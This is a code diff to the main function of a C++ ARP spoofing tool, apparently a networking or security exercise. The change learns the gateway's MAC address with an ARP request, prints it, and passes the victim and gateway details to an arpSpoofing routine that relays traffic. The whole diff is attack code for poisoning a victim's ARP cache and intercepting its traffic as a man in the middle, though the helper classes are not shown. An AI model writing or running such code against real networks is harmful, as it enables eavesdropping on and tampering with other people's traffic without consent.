@@ -2,7 +2,7 @@
 
 int main(int argc, char* argv[]){
 	struct in_addr      victim_ip;
-    struct ether_addr   victim_mac;
+    struct ether_addr   victim_mac, gateway_mac;
 	int 		i = 0;
 	myPCAP		pcap_class;
 	myIP		ip_class;
@@ -29,6 +29,13 @@ int main(int argc, char* argv[]){
     // send arp request packet to get gateway mac info.
     arp_class.setARPpacket(mac_class.my_mac_address, mac_class.broadcastMac,
 							mac_class.my_mac_address, ip_class.attacker_ip,
+							mac_class.zero_fill_mac, ip_class.gateway_ip,
+							ARPOP_REQUEST, pcap_class.pcd);
+    pcap_class.sendARPpacket(arp_class);
+    pcap_class.pcapCapture(&ip_class.gateway_ip, &gateway_mac);	// get ARP reply, filtering it to get correct reply
+    // send arp request packet to get victim mac info.
+    arp_class.setARPpacket(mac_class.my_mac_address, mac_class.broadcastMac,
+							mac_class.my_mac_address, ip_class.attacker_ip,
 							mac_class.zero_fill_mac, victim_ip,
 							ARPOP_REQUEST, pcap_class.pcd);
     pcap_class.sendARPpacket(arp_class);
@@ -43,6 +50,9 @@ int main(int argc, char* argv[]){
     printf("victim mac address: ");
     for(i=0;i<ETHER_ADDR_LEN;i++)
     	printf("%02X%c", victim_mac.ether_addr_octet[i], ((i!=ETHER_ADDR_LEN-1) ? ':' : '\n'));
+    printf("gateway mac address: ");
+    for(i=0;i<ETHER_ADDR_LEN;i++)
+    	printf("%02X%c", gateway_mac.ether_addr_octet[i], ((i!=ETHER_ADDR_LEN-1) ? ':' : '\n'));
     
     // arp spoofing (relay included)
     // set ARP packet to reply packet and pass it to the arp_spoofing function
@@ -50,9 +60,7 @@ int main(int argc, char* argv[]){
 							mac_class.my_mac_address, ip_class.gateway_ip,
 							victim_mac, victim_ip,
 							ARPOP_REPLY, pcap_class.pcd);
-	// in the arp_spoofing function, we just check the condition and call sendARPpacket(packet)
-    //pcap_class.sendARPpacket(arp_class);
-    pcap_class.arpSpoofing(arp_class);
+    pcap_class.arpSpoofing(arp_class, ip_class, mac_class, victim_ip, gateway_mac);
 
 	return 1;
 }
